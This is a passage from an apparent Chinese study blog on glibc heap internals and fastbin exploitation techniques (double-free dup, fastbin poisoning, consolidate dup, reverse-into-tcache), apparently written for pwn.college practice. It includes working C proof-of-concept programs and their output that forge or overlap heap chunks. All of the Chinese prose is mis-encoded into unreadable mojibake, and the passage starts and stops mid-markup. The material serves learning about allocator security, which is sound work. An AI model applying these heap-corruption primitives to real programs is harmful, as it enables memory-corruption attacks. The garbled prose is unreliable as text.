class="comment">/* 0x0888      |  0x0008 */</span>    <span class="type">size_t</span> system_mem;</span><br><span class="line"><span class="comment">/* 0x0890      |  0x0008 */</span>    <span class="type">size_t</span> max_system_mem;</span><br><span class="line"></span><br><span class="line">                               <span class="comment">/* total size (bytes): 2200 */</span></span><br><span class="line">                             &#125;</span><br></pre></td></tr></table></figure>
<p>å¦‚æœfreelistä¸ºç©º,è¯´æ˜å½“å‰æ²¡æœ‰ç©ºé—²çš„åˆ†é…åŒº,ä½†æ˜¯å“¥ä»¬æ€¥ç€è¦ç”¨å †å—,æ€ä¹ˆåŠå‘¢?
å°è¯•åˆ›å»ºä¸€ä¸ªæ–°çš„åˆ†é…åŒº</p>
<p>ä½†ä¹Ÿä¸æ˜¯ä¸€æ€¥å°±å¾—ç«‹åˆ»åˆ›å»ºæ–°åˆ†é…åŒº,
è¿™ä¸ªåˆ†é…åŒºæœ‰ä¸€ä¸ªæ•°é‡ä¸Šé™,<code>8*æ ¸å¿ƒæ•°</code></p>
<p>å¦‚æœèƒ½å¤Ÿåˆ›å»º,é‚£ä¹ˆå°±è°ƒç”¨<code>_int_new_arena</code>åˆ›å»ºæ–°åˆ†é…åŒº</p>
<p>è¿™ä¸ªå‡½æ•°ä¼šè°ƒç”¨<code>new_heap</code>,ç»§è€Œè°ƒç”¨<code>alloc_new_heap</code>å‡½æ•°åˆ›å»ºä¸€ä¸ª<code>heap_info</code>ç»“æ„</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">h = new_heap (size + (<span class="keyword">sizeof</span> (*h) + <span class="keyword">sizeof</span> (*a) + MALLOC_ALIGNMENT), mp_.top_pad);</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">heap_info *h = alloc_new_heap (size, top_pad, mp_.hp_pagesize, mp_.hp_flags);</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p2 = (<span class="type">char</span> *) MMAP (aligned_heap_area, max_size, PROT_NONE, mmap_flags);</span><br></pre></td></tr></table></figure>
<p>å®é™…ä¸Šä¼šè°ƒç”¨mmapç³»ç»Ÿè°ƒç”¨å‘æ“ä½œç³»ç»Ÿè¦ä¸€å¤§å—ç©ºé—´</p>
<h2 id="exploit-1">exploit</h2>
<h3 id="fastbins">fastbins</h3>
<h4 id="double-free-dup">double free dup</h4>
<p><code>fastbins</code>ä¸­å¯¹äºäºŒæ¬¡é‡Šæ”¾çš„åˆ¤æ–­å¾ˆå”æ°</p>
<p><code>fastbins</code>åªä¼šåˆ¤æ–­å½“å‰æ­£åœ¨é‡Šæ”¾çš„å †å—å’ŒæŒ‚åœ¨æ¡¶å­å¤´ä¸Šçš„ç¬¬ä¸€å—æ˜¯ä¸æ˜¯ç›¸åŒ,
å¦‚æœæ˜¯å°±è®¤ä¸ºæ˜¯<code>Double Free</code>äº†</p>
<p>å¦‚æœ<code>fastbin</code>ä¸Šè¿™æ ·:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fastbin[idx] =&gt; A =&gt; B =&gt; NULL</span><br></pre></td></tr></table></figure>
<p>æ­¤æ—¶é‡Šæ”¾<code>B</code>å°±å¯ä»¥ç»•è¿‡æ£€æŸ¥é€ æˆ<code>Double Free</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fastbin[idx] =&gt; B =&gt; A =&gt; B =&gt; NULL</span><br></pre></td></tr></table></figure>
<p>è¿™åˆæœ‰ä¸ªé—®é¢˜,ä½¿ç”¨<code>malloc</code>ç”³è¯·å†…å­˜æ—¶</p>
<p>å¦‚æœ<code>tcachebins</code>ä¸­æœ‰ä¸œè¥¿,é‚£ä¹ˆ<code>malloc</code>ä¼šä»<code>tcache</code>ä¸­æ‹¿,ä¸ä¼šæ‹¿<code>fastbins</code>çš„</p>
<p>ä½†æ˜¯å¦‚æœ<code>tcachebins</code>ä¸­æ²¡ä¸œè¥¿,é‚£ä¹ˆå½“ä»<code>fastbins</code>ä¸­æ‹¿ä¸€ä¸ªä¹‹å,å‰©ä¸‹çš„éƒ½ä¼šè¢«æ”¾åˆ°<code>tcachebins</code>ä¸­</p>
<p>ä¸ºäº†é¿å…<code>tcache</code>æŠ¢ä¸œè¥¿,å¯ä»¥ä½¿ç”¨<code>calloc</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">malloc =&gt; __libc_malloc	//æ­¤å¤„é¦–å…ˆå°è¯•ä»tcacheè·å–å †å—</span><br><span class="line">	_int_malloc			//æ­¤å¤„å°è¯•ä»æ–Œå®¶è·å–</span><br><span class="line">	</span><br><span class="line">calloc =&gt; __libc_malloc	//ä¸ä½¿ç”¨tcache,ç›´æ¥è°ƒç”¨_int_malloc</span><br><span class="line">	_int_malloc			//æ­¤å¤„å°è¯•ä»æ–Œå®¶è·å–,ä½†æ˜¯å¦‚æœtcacheä¸æ»¡,è¿˜æ˜¯ä¼šæŠ¢æ–Œå®¶çš„å¡«æ»¡tcache</span><br></pre></td></tr></table></figure>
<p>ä¸ºäº†é¿å…<code>tcache</code>é€ æˆå½±å“,å¯ä»¥é¦–å…ˆå°†<code>tcache</code>å¡«æ»¡,ç›®çš„æ˜¯åœ¨æ–Œå®¶åˆ†é…ä¸€æ¬¡å,é¿å…å‰©ä½™çš„å †å—è¿›å…¥<code>tcache</code></p>
<p>ç„¶åä½¿ç”¨<code>calloc</code>å‡½æ•°åˆ†é…,ç›®çš„æ˜¯é¿å…ä»<code>tcache</code>ä¸­å–å †å—</p>
<p>å†™ä¸ª<code>exp</code>æ„æ€æ„æ€</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;printf this time will establish a write buffer\n&quot;</span>);</span><br><span class="line">    <span class="type">size_t</span> *tcache_chunks[<span class="number">7</span>];</span><br><span class="line">    <span class="type">size_t</span> *A;</span><br><span class="line">    <span class="type">size_t</span> *B;</span><br><span class="line">    <span class="type">size_t</span> *C;</span><br><span class="line">    <span class="comment">// size_t *barrier;        </span></span><br><span class="line">    A = <span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line">    B = <span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">7</span>;i++)&#123;       </span><br><span class="line">        tcache_chunks[i] = <span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">7</span>;i++)&#123;       <span class="comment">//fill tcache</span></span><br><span class="line">        <span class="built_in">free</span>(tcache_chunks[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(B);                    <span class="comment">//next free to fastbin</span></span><br><span class="line">    <span class="built_in">free</span>(A);</span><br><span class="line">    <span class="built_in">free</span>(B);</span><br><span class="line">    <span class="comment">//fastbins[idx] =&gt; B =&gt; A =&gt; B</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    B = <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">0x40</span>);           <span class="comment">//next malloc from fastbin</span></span><br><span class="line">    A = <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">0x40</span>);</span><br><span class="line">    C = <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">0x40</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;B: %p\n&quot;</span>, B);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;A: %p\n&quot;</span>, A);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;C: %p\n&quot;</span>, C);</span><br><span class="line">    assert(B == C);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/bins# make</span><br><span class="line">gcc -w -g -o fastbin_dup fastbin_dup.c -o fastbin_dup</span><br><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/bins# ./fastbin_dup</span><br><span class="line"><span class="built_in">printf</span> this time will establish a write buffer</span><br><span class="line">B: 0x55dd112b2700</span><br><span class="line">A: 0x55dd112b26b0</span><br><span class="line">C: 0x55dd112b2700</span><br></pre></td></tr></table></figure>
<h4 id="poison">poison</h4>
<p>åˆ©ç”¨<code>Double Free</code>,æˆ–è€…å…¶ä»–æ‰‹æ®µ,
ä½¿å¾—å †ç®¡ç†å™¨æŒæœ‰æŸä¸ªå †å—æŒ‡é’ˆçš„åŒæ—¶, æˆ‘ä»¬ä¹ŸæŒæœ‰ä¸€ä¸ª</p>
<p>æ­¤æ—¶æˆ‘ä»¬åˆ©ç”¨è¿™ä¸ªæŒ‡é’ˆè¿›è¡Œ<code>Use After Free</code>,
å¯¹è¯¥å·²ç»é‡Šæ”¾çš„å †å—è¿›è¡Œå†™å…¥æ“ä½œ, è¦†ç›–è¯¥å †å—çš„å…ƒæ•°æ®,
ä¿®æ”¹<code>fd</code>æŒ‡é’ˆæŒ‡å‘ä»»æ„åœ°å€</p>
<p>å†™ä¸ª<code>poc</code>æ„æ€æ„æ€</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> sz  0x40</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    <span class="type">size_t</span> prev_size;</span><br><span class="line">    <span class="type">size_t</span> size;</span><br><span class="line">    <span class="type">size_t</span>* fd;</span><br><span class="line">    <span class="type">size_t</span>* bk;</span><br><span class="line">&#125;malloc_chunk;</span><br><span class="line"></span><br><span class="line">malloc_chunk fake_chunk=&#123;</span><br><span class="line">    .prev_size = <span class="number">0</span>,</span><br><span class="line">    .size = (sz + <span class="number">0x10</span>) | <span class="number">1</span>,</span><br><span class="line">    .fd = <span class="number">0</span>,</span><br><span class="line">    .bk = <span class="number">0</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;printf this time will establish a write buffer\n&quot;</span>);</span><br><span class="line">    <span class="type">size_t</span> * tcache_chunks[<span class="number">7</span>];</span><br><span class="line">    <span class="type">size_t</span> * A;</span><br><span class="line">    <span class="type">size_t</span> * B;</span><br><span class="line">    <span class="type">size_t</span> * C;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">7</span>;i++)&#123;</span><br><span class="line">        tcache_chunks[i] = (<span class="type">size_t</span>*)<span class="built_in">malloc</span>(sz);</span><br><span class="line">    &#125;</span><br><span class="line">    A = (<span class="type">size_t</span>*)<span class="built_in">malloc</span>(sz);</span><br><span class="line">    B = (<span class="type">size_t</span>*)<span class="built_in">malloc</span>(sz);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">7</span>;i++)&#123;           <span class="comment">//fill tcache</span></span><br><span class="line">        <span class="built_in">free</span>(tcache_chunks[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">free</span>(A);                        <span class="comment">//free to fastbin</span></span><br><span class="line">    <span class="built_in">free</span>(B);</span><br><span class="line">    <span class="built_in">free</span>(A);</span><br><span class="line">    <span class="comment">//fastbins[idx] =&gt; A =&gt; B =&gt; A</span></span><br><span class="line"></span><br><span class="line">    A = <span class="built_in">calloc</span>(<span class="number">1</span>,sz);</span><br><span class="line">    B = <span class="built_in">calloc</span>(<span class="number">1</span>,sz);</span><br><span class="line">    <span class="comment">//fastbins[idx] =&gt; A</span></span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> * fake_chunk_mem = (<span class="type">char</span>*)&amp;fake_chunk + <span class="number">0x10</span>;</span><br><span class="line">    A[<span class="number">0</span>] = ((<span class="type">size_t</span>)A &gt;&gt; <span class="number">12</span>) ^ (<span class="type">size_t</span>)&amp;fake_chunk;</span><br><span class="line">    <span class="comment">//fastbins[idx] =&gt; A =&gt; fake_chunk</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;fake_chunk_mem = %p\n&quot;</span>, fake_chunk_mem);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;A = %p\n&quot;</span>, A);</span><br><span class="line">    A = <span class="built_in">calloc</span>(<span class="number">1</span>,sz);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;A = %p\n&quot;</span>, A);</span><br><span class="line">    C = <span class="built_in">calloc</span>(<span class="number">1</span>,sz);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;C = %p\n&quot;</span>, C);</span><br><span class="line">    assert(C == fake_chunk_mem);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/bins/test# make</span><br><span class="line">gcc -w -g -o fastbin_poison fastbin_poison.c -o fastbin_poison</span><br><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/bins/test# ./fastbin_poison</span><br><span class="line"><span class="built_in">printf</span> this time will establish a write buffer</span><br><span class="line">fake_chunk_mem = 0x55d7ebf53030</span><br><span class="line">A = 0x55d7ed23d8e0</span><br><span class="line">A = 0x55d7ed23d8e0</span><br><span class="line">C = 0x55d7ebf53030</span><br></pre></td></tr></table></figure>
<h4 id="dup_with_consolidate">dup_with_consolidate</h4>
<p>0.å¡«å……<code>tcache</code></p>
<p>1.æ‰¾ä¸€ä¸ªä¸<code>topchunk</code>ç›¸é‚»çš„å°å †å—,<code>free</code>è¿›å…¥<code>fastbins</code>,==å¹¶ç»§ç»­æŒæœ‰å…¶æŒ‡é’ˆ==</p>
<p>2.å‘èµ·<code>0x400</code>å­—èŠ‚çš„åˆ†é…ç”³è¯·,å¯¼è‡´<code>malloc_consolidate</code>,ä½¿å¾—<code>fastbins</code>ä¸­çš„å †å—åˆå¹¶åˆ°<code>topchunk</code>,ç„¶åæœ¬æ¬¡ç”³è¯·æ‹¿åˆ°åŒä¸€ä¸ªæŒ‡é’ˆ,ä½†æ˜¯å †å—å¤§å°å˜æˆäº†<code>0x411</code>(åŒ…æ‹¬å…ƒæ•°æ®,æ ‡å¿—ä½å’Œç”¨æˆ·ç©ºé—´)</p>
<p>3.<code>free</code>å°å †å—çš„é‡æŒ‡é’ˆ,è¿™å®é™…ä¸Šä¼šå¯¼è‡´å¤§å—è¢«é‡Šæ”¾è¿›å…¥<code>unsortedbin</code></p>
<p>4.å†æ¬¡å‘èµ·<code>0x400</code>å­—èŠ‚çš„åˆ†é…ç”³è¯·,å†æ¬¡æ‹¿åˆ°åŒä¸€ä¸ªå †å—</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;this printf will establish the write buffer\n&quot;</span>);</span><br><span class="line">    <span class="type">size_t</span> * tcache_chunks[<span class="number">7</span>];</span><br><span class="line">    <span class="type">size_t</span> * A;</span><br><span class="line">    <span class="type">size_t</span> * B;</span><br><span class="line">    <span class="type">size_t</span> * C;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">7</span>;++i)&#123;</span><br><span class="line">        tcache_chunks[i] = <span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    A = <span class="built_in">malloc</span>(<span class="number">0x40</span>);           <span class="comment">//malloc a chunk next to the topchunk</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">7</span>;++i)&#123;</span><br><span class="line">        <span class="built_in">free</span>(tcache_chunks[i]); <span class="comment">//fill the tcache</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// A = calloc(1,0x40);</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;A:%p\n&quot;</span>,A);</span><br><span class="line">    <span class="built_in">free</span>(A);                    <span class="comment">//return A back to fastbins</span></span><br><span class="line"></span><br><span class="line">    B = <span class="built_in">malloc</span>(<span class="number">0x400</span>);          <span class="comment">//cause a malloc_consolidate , merge A with the topchunk , then malloc B with the same address of A</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;B:%p\n&quot;</span>,B);</span><br><span class="line">    assert(A == B);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(A);                    <span class="comment">//double free A , then B will be free</span></span><br><span class="line"></span><br><span class="line">    C = <span class="built_in">malloc</span>(<span class="number">0x400</span>);          <span class="comment">//malloc C at the same address of B </span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;C:%p\n&quot;</span>,C);</span><br><span class="line">    assert(C == B);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/bins/test# ./fastbin_dup_consolidate</span><br><span class="line">this <span class="built_in">printf</span> will establish the write buffer</span><br><span class="line">A:<span class="number">0x563058c578e0</span></span><br><span class="line">B:<span class="number">0x563058c578e0</span></span><br><span class="line">C:<span class="number">0x563058c578e0</span></span><br></pre></td></tr></table></figure>
<p>ç‰¹ç‚¹æ˜¯ä¸éœ€è¦<code>calloc</code></p>
<h4 id="reverse_into_tcache">reverse_into_tcache</h4>
<p>å¦‚æœ<code>fastbin</code>ä¸­æœ‰å¤šäºä¸€ä¸ªå †å—,<code>tcache</code>ç©º</p>
<p>é‚£ä¹ˆä»è¯¥<code>fastbin</code>ä¸­æ‹¿ä¸€ä¸ªå †å—æ—¶,é¦–å…ˆä¼šæŠŠ<code>tcache</code>å¡«æ»¡,ç„¶åå†ä»<code>tcache</code>ä¸­æ‹¿å‡ºä¸€ä¸ªå †å—æ¥</p>
<p>å¹¶ä¸”<code>fastbin</code>å’Œ<code>tcache</code>éƒ½æ˜¯é“¾æ ˆç»“æ„</p>
<p>è¿™ä¼šå¯¼è‡´<code>fastbin</code>ä¸­çš„å †å—è¿æ¥é¡ºåºåè¿‡æ¥</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fastbins[idx]-&gt;1-&gt;2-&gt;3-&gt;4-&gt;5-&gt;6-&gt;7</span><br><span class="line"></span><br><span class="line">tcachebins[idx]-&gt;7-&gt;6-&gt;5-&gt;4-&gt;3-&gt;2-&gt;1</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123; </span><br><span class="line">    <span class="type">size_t</span> *tcache_chunks[<span class="number">7</span>];</span><br><span class="line">    <span class="type">size_t</span> *fastbin_chunks[<span class="number">7</span>];</span><br><span class="line">    <span class="type">int</span> usable_size = <span class="number">0x10</span>;</span><br><span class="line">    <span class="type">int</span> chunk_size = ( usable_size + <span class="number">0x10</span> ) | <span class="number">1</span>;</span><br><span class="line">    <span class="type">size_t</span> fake_chunk[<span class="number">7</span>];</span><br><span class="line">    <span class="built_in">memset</span>(fake_chunk,<span class="number">0x3c</span>,<span class="keyword">sizeof</span>(fake_chunk));</span><br><span class="line">    <span class="type">size_t</span> * victim;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">7</span>;++i)&#123;</span><br><span class="line">        tcache_chunks[i] = <span class="built_in">malloc</span>(usable_size);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">7</span>;i++)&#123;</span><br><span class="line">        fastbin_chunks[i] = <span class="built_in">malloc</span>(usable_size);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">7</span>;i++)&#123;</span><br><span class="line">        <span class="built_in">free</span>(tcache_chunks[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">7</span>;i++)&#123;</span><br><span class="line">        <span class="built_in">free</span>(fastbin_chunks[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    *fastbin_chunks[<span class="number">0</span>] = ((<span class="type">size_t</span>)fastbin_chunks[<span class="number">0</span>] &gt;&gt; <span class="number">12</span>) ^ ((<span class="type">size_t</span>)&amp;fake_chunk);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">7</span>;i++)&#123;</span><br><span class="line">        tcache_chunks[i] = <span class="built_in">malloc</span>(usable_size);     <span class="comment">//empty tcache</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">malloc</span>(usable_size);            <span class="comment">//reverse fastbin into tcache</span></span><br><span class="line">    victim = <span class="built_in">malloc</span>(usable_size);   <span class="comment">//get stack address</span></span><br><span class="line">    assert(victim == (<span class="type">size_t</span>*)&amp;fake_chunk[<span class="number">2</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/bins/test# gcc fastbin_reverse_into_tcache.c -o fastbin_reverse_into_tcache -w -g</span><br><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/bins/test# ./fastbin_reverse_into_tcache</span><br></pre></td></tr></table></figure>
<h4 id="house_of_mind">house_of_mind</h4>
<p>ä¸ä¼š</p>
<h4 id="house_of_spirit">house_of_spirit</h4>
<p>ä»»æ„å †å—é‡Šæ”¾è¿›å…¥<code>fastbin</code></p>
<p>æ„é€ å‡å †å—æ—¶éœ€è¦æ³¨æ„ç‰©ç†ä¸Šç›¸é‚»çš„ä¸‹ä¸€ä¸ªå †å—çš„<code>prev_size</code>å­—æ®µ</p>
<p>è¿™é‡Œæœ‰ä¸€ä¸ªæ£€æŸ¥</p>
